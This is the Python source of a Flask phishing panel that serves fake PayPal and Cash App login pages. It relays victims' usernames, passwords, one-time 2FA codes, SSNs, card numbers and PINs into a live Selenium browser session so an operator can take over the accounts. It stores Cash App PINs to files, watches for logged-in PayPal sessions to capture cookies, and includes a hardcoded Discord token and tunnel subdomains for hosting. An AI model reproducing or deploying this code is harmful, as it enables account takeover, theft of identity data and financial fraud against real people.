import random
import requests
import time
from textwrap import wrap
from flask import Flask, render_template, redirect, url_for, request
from multiprocessing import Process
import app as application
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options as ChromeOptions
import requests
import textwrap
import pickle
import os
import threading
from flask_sslify import SSLify
from datetime import date


from pyngrok import ngrok
from flask_ngrok import run_with_ngrok




PATH = "C:\Program Files (x86)\chromedriver.exe"
delay = 19
chrome_options = ChromeOptions()
app = Flask(__name__)
sslify = SSLify(app)
driver = webdriver.Chrome(PATH, options=chrome_options)


header ={'authorization': 'OTI3NTg0NzAwOTU0OTc2Mjg2.GXJ1Zk.xx4RexVa8-lgWyAZ-qbr3caYmrCdDK-4osMo_w'}
#run_with_ngrok(app)



def paypalapp():
    print("kanker")
    timer = 0
    while driver.current_url != "https://www.paypal.com/myaccount/summary":
       timer +=1
    print(timer)
    cookies = r'D:\Pyhton\Anacond\panel\cookies'
    count = 0
    for path in os.listdir(cookies):
       # check if current path is a file
       if os.path.isfile(os.path.join(cookies, path)):
           count += 1
    #pickle.dump(driver.get_cookies(), open("cookies/cookies"+str(count)+".pkl", "wb"))
    driver.delete_all_cookies()


def paypal_login():
    driver.get("https://www.paypal.com/signout")
    pwd = request.form['wachtwoord']
    usr = request.form['gebruikersnaam']
    print(pwd)
    print(usr)
    driver.get("https://www.paypal.com/signin?")
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/section[2]/div[1]/div/div[1]/div/form/div[3]/div[1]/div[2]/div[1]/input"))).send_keys(usr)
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/section[2]/div[1]/div/div[1]/div/form/div[3]/div[2]/button"))).click()
    try:
        WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[3]/div[1]/div[1]/div/div/div/div/h1")))
        print("KANKER CAPPA")
        input()
    except:
        pass


    time.sleep(2)
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/section[2]/div[1]/div/div[1]/div/form/div[4]/div[1]/div/div/div[1]/input"))).send_keys(pwd)
    driver.find_element_by_xpath("/html/body/div[1]/section[2]/div[1]/div/div[1]/div/form/div[4]/div[3]/button").click()
    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/section[1]/div[1]/div/div[1]/div/div[1]/p")))
        return True
    except:
        try:
            print("proberen knop 1")
            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div/div/div[2]/div[1]/div/fieldset/div/div/div[3]/button"))).click()
            return False
        except:
            try:
                print("proberen knop 2 kanker franse man")
                driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/div/fieldset/div/div/div[3]/button").click()
                return False
            except:
                print("proberen knop aziaat")
                driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/section/fieldset/div[4]/div[2]/button").click()
                return False

    print("JATOCH IZJEN REDIRECT SMS")
    return False


    # check error
    #if error: return "error"



    #button_0 = WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/div/div/div[2]/div[1]/div/fieldset/div/div/fieldset/div[1]")))
    #text_0 = WebDriverWait(button_0, delay).until(EC.presence_of_element_located(("/label/div/div[1]"))).innerHTML
    #button_1 = WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/div/div/div[2]/div[1]/div/fieldset/div/div/fieldset/div[2]")))
    #text_1 = WebDriverWait(button_1, delay).until(EC.presence_of_element_located(("/label/div/div[1]"))).innerHTML
    #if not driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/div/fieldset/div/div/fieldset/div[3]")
    #    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/div/div/div[2]/div[1]/div/fieldset/div/div/fieldset/div[1]/input"))).click()
    #    return False
    #return True
    """
    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/section[1]/div[1]/div/div[1]/div/div[1]/p")))
        error_code = True

    except:
        error_code = False
        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/div/div/div[2]/div[1]/div/fieldset/div/div/div[3]/button"))).click()
    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div/div/div[2]/div[1]/form/div[1]/div/div[2]/div[1]/div[1]/input")))
        sms_code = True
    except:
        sms_code = False
    return error_code, sms_code
    """

def paypal_2fa_choice(button_xpath):
    pass  # enter 2fa


def paypal_2fa_enter():
    n1=request.form["ist"]
    n2=request.form["sec"]
    n3=request.form["third"]
    n4=request.form["fourth"]
    n5=request.form["fifth"]
    n6=request.form["sixth"]
    print(n1)
    print(n2)
    print(n3)
    print(n4)
    print(n5)
    print(n6)
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div/div/div[2]/div[1]/form/div[1]/div/div[2]/div[1]/div[1]/input"))).send_keys(n1)
    driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/form/div[1]/div/div[2]/div[1]/div[2]/input").send_keys(n2)
    driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/form/div[1]/div/div[2]/div[1]/div[3]/input").send_keys(n3)
    driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/form/div[1]/div/div[2]/div[1]/div[4]/input").send_keys(n4)
    driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/form/div[1]/div/div[2]/div[1]/div[5]/input").send_keys(n5)
    driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/form/div[1]/div/div[2]/div[1]/div[6]/input").send_keys(n6)
    driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/form/div[2]/button").click()
    while driver.current_url != "https://www.paypal.com/myaccount/summary":
       timer +=1
    print(timer)
    cookies = r'D:\Pyhton\Anacond\panel\cookies'
    count = 0
    for path in os.listdir(cookies):
       # check if current path is a file
       if os.path.isfile(os.path.join(cookies, path)):
           count += 1
    #pickle.dump(driver.get_cookies(), open("cookies/cookies"+str(count)+".pkl", "wb"))

def cookiesave():
    while True:
        while "https://www.paypal.com/myaccount/summary" not in driver.current_url:
            pass
        cookies = r'D:\Pyhton\Anacond\panel\cookies'
        count = 0
        for path in os.listdir(cookies):
           # check if current path is a file
           if os.path.isfile(os.path.join(cookies, path)):
               count += 1
        #pickle.dump(driver.get_cookies(), open("cookies/cookies"+str(count)+".pkl", "wb"))



def authchecker():
    time.sleep(2)

    if "https://www.paypal.com/authflow/twofactor/" in driver.current_url:
        return True
    else:
        while "https://www.paypal.com/authflow/entry/" in driver.current_url:
            time.sleep(0.1)
        if "https://www.paypal.com/authflow/challenges/pn/" in driver.current_url: #APP
            print("JATOCH IZJEN REDIRECT APP")
            return False
        elif "https://www.paypal.com/authflow/challenges/sms/" in driver.current_url: #SMS
            print("JATOCH IZJEN REDIRECT SMS")
            return True
        elif "https://www.paypal.com/authflow/twofactor/" in driver.current_url: #SMS
            print("JATOCH IZJEN REDIRECT SMS")
            return True
        elif "https://www.paypal.com/authflow/challenges/whatsapp" in driver.current_url: #SMS
            print("JATOCH IZJEN REDIRECT WHATSAPP")
            return True


def cashapplogin():
    usr = request.form['usr']
    print(usr)
    driver.get("https://cash.app/login")
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/form/div[1]/input"))).send_keys(usr)
    try:
        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/form/div[2]/div/button"))).click()
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/h1")))
        return True
    except:
        return False


def cashappcodefillin():
    code = request.form['code']
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/form/div[1]/div/div/input"))).send_keys(code)
    driver.find_element_by_xpath("/html/body/div/div/section/div/form/div[2]/button").click()

    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/div/p/span")))

        if "SSN" in driver.find_element_by_xpath("/html/body/div/div/section/div/div/p/span").get_attribute('innerHTML'):
            return "SSN"
        elif "card" in driver.find_element_by_xpath("/html/body/div/div/section/div/div/p/span").get_attribute('innerHTML'):
            return "card"
        else:
            return "pin"

        return True
    except:
        return False

def cashapppinfillin():
    n1=request.form["ist"]
    n2=request.form["sec"]
    n3=request.form["third"]
    n4=request.form["fourth"]
    cookies = r'D:\Pyhton\Anacond\panel\cashapplogins'
    count = 0
    for path in os.listdir(cookies):
        # check if current path is a file
        if os.path.isfile(os.path.join(cookies, path)):
            count += 1
    count += 1
    f = open(f"cashapplogins/{count}.txt", "a")
    f.write(str(n1) + str(n2) + str(n3) + str(n4))
    f.close()
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/div/div[1]/div/div[1]"))).send_keys(n1)
    driver.find_element_by_xpath("/html/body/div/div/section/div/div/div[1]/div/div[2]").send_keys(n2)
    driver.find_element_by_xpath("/html/body/div/div/section/div/div/div[1]/div/div[3]").send_keys(n3)
    driver.find_element_by_xpath("/html/body/div/div/section/div/div/div[1]/div/div[4]").send_keys(n4)
    try:
        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/div[3]/div/div/div/div/i/img")))
        return True
    except:
        return False


def cashappcardauth():
    card = request.form["card"]
    print(card)
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/div/form/div[1]/div/input"))).send_keys(card)
    driver.find_element_by_xpath("/html/body/div/div/section/div/div/form/div[2]/button").click()
    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/div/p[2]")))
        return False
    except:
        return True


def cashappssnauth():
    ssn = request.form["ssn"]
    print(ssn)
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/div/form/div[1]/div/div/input"))).send_keys(ssn)
    driver.find_element_by_xpath("/html/body/div/div/section/div/div/form/div[2]/button").click()
    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/section/div/div/p[2]")))
        return False
    except:
        return True





@app.route("/paypal/sms_auth", methods=["POST", "GET"])
def paypal_sms():
    if request.method == "POST":
        try:
            paypal_2fa_enter()
            return redirect("https://mega.nz/folder/d6RDVCRC#LiXWgp2faIFRDZ5rLOB2TQ/folder/NqJEFBjB", code=302)
        except:
            pass
    return render_template('paypal/2faphone.html')  # CHANGE



@app.route("/paypal/app_auth", methods=["POST", "GET"])
def paypal_app():
    thread = threading.Thread(target=cookiesave)
    thread.start()
    return render_template('paypal/2fa.html')


@app.route("/paypal/authflow", methods=["POST", "GET"])
def paypal_auth_choice():
    if request.method == "POST":
        pass  # get choice
        paypal_2fa_choice(choice)
        if choice == "sms": return redirect("/paypal/sms_auth")
        return redirect("/paypal/app_auth")
    return render_template('paypal/2fa_keuze.html')  # CHANGE



@app.route("/paypal", methods=["POST", "GET"])
def home():
    if request.method == "POST":
        try:
            driver.delete_all_cookies()
            ret = paypal_login()
            if ret == True:  return render_template('paypal/wrongpwd.html')
            if ret == False:
                ret = authchecker()
                if ret == True: return redirect("/paypal/sms_auth")
                if ret == False: return redirect("/paypal/app_auth")
        except:
            return render_template('paypal/wrongpwd.html')
    return render_template('paypal/index.html')


@app.route("/cashapp/pin", methods=["POST", "GET"])
def cashapppin():
    if request.method == "POST":
        try:
            ret = cashapppinfillin()
            if ret == False:
                return render_template('cashapp/pinfalse.html')
            elif ret == True:
                return render_template('cashapp/payment.html')
        except: pass
    return render_template('cashapp/pin.html')

@app.route("/cashapp/signincode", methods=["POST", "GET"])
def cashappcode():
    if request.method == "POST":
        try:
            ret =cashappcodefillin()
            if ret == "SSN":
                return redirect('/cashapp/ssn')
            elif ret == "card":
                return redirect('/cashapp/card')
            elif ret == "pin":
                return redirect('/cashapp/pin')

            elif ret == False:
                return render_template('cashapp/codefalse.html')
        except: pass
    return render_template('cashapp/code.html')

@app.route("/cashapp/ssn", methods=["POST", "GET"])
def cashappssn():
    if request.method == "POST":
        try:
            ret = cashappssnauth()
            if ret == True:
                return redirect('/cashapp/pin')
            elif ret == False:
                return render_template('cashapp/ssnfalse.html')
        except:
            return render_template('cashapp/ssn.html')
    return render_template('cashapp/ssn.html')


@app.route("/cashapp/card", methods=["POST", "GET"])
def cashappcard():
    if request.method == "POST":
        try:
            ret = cashappcardauth()
            if ret == True:
                return redirect('/cashapp/pin')
            elif ret == False:
                return render_template('cashapp/cardfalse.html')
        except:
            return render_template('cashapp/card.html')
    return render_template('cashapp/card.html')


@app.route("/cashapp", methods=["POST", "GET"])
def cashapp():
    if request.method == "POST":
        try:
            ret = cashapplogin()
            if ret == True:
                return redirect('/cashapp/signincode')
            else:
                return render_template('cashapp/indexfalse.html')
        except: pass
    return render_template('cashapp/index.html')  # CHANGE


@app.route("/$marnicksnicker", methods=["POST", "GET"])
def cashapptag():
    if request.method == "POST":
        try:
            ret = cashapplogin()
            if ret == True:
                return redirect('/cashapp/signincode')
            else:
                return render_template('cashapp/indexfalse.html')
        except: pass
    return render_template('cashapp/index.html')  # CHANGE


@app.route("/", methods=["POST", "GET"])
def homepage():
    if request.method == "POST":
        print("NEW VISITOR")
        #payload = {'content': "NEW VISITOR"}
        #requests.post("https://discord.com/api/v9/channels/1021419448676139161/messages", data=payload, headers=header)
        return redirect("/paypal")
    return render_template('start/index.html')  # CHANGE


@app.route("/vis", methods=["POST", "GET"])
def vis():
    return render_template('blank.html')  # CHANGE


#lt --port 5000 --subdomain megasupplier
#lt --port 5000 --subdomain verylegalmegas

if __name__ == "__main__":
    app.run(debug=True)